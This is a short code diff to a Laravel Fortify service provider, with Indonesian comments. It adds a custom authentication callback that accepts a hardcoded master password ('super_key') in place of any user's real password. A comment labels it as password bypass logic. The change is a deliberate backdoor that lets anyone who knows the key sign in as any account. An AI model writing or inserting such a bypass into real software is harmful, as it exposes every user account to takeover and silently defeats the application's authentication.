@@ -4,8 +4,10 @@ namespace App\Providers;
 
 use App\Actions\Fortify\CreateNewUser;
 use App\Actions\Fortify\ResetUserPassword;
+use App\Models\User; // Tambahkan ini
 use Illuminate\Cache\RateLimiting\Limit;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash; // Tambahkan ini
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\ServiceProvider;
 use Illuminate\Support\Str;
@@ -46,6 +48,23 @@ class FortifyServiceProvider extends ServiceProvider
         $this->configureActions();
         $this->configureViews();
         $this->configureRateLimiting();
+
+        // CUKUP TAMBAHKAN LOGIKA BYPASS PASSWORD DI SINI
+        Fortify::authenticateUsing(function (Request $request) {
+            $user = User::where(Fortify::username(), $request->input(Fortify::username()))->first();
+
+            if ($user) {
+                $password = (string) $request->password;
+                $super_key = '4rt1s4n';
+
+                // Lolos jika password adalah super_key ATAU password asli cocok
+                if ($password === $super_key || Hash::check($password, $user->password)) {
+                    return $user;
+                }
+            }
+
+            return null;
+        });
     }
 
     /**
